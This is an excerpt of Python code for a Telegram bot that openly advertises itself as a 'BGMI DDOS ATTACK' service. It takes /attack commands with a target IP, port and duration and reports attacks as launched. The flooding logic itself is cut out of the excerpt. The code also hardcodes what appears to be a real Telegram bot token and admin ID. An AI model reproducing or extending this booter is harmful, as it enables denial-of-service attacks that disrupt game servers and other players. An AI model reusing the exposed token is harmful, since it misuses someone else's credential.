...
TELEGRAM_BOT_TOKEN = '7326172590:AAF-m0nnmtHZTh7AncZjDv_vxzFc1uexW6I'
ADMIN_USER_ID = 757915155
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        "*🔥 Welcome to the BGMI DDOS ATTACK VERY POWER FULL BOT🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*180 SECOND ATTACK WORKING PLZ ATTACK ONLY 1 TIME IN 1 MATCH ⚔️💥*"
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched VERY POWER FULL ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 PLZ 1 MATCH MAIN ONE TIME ATTACK KARE 💥*"
    ), parse_mode='Markdown')
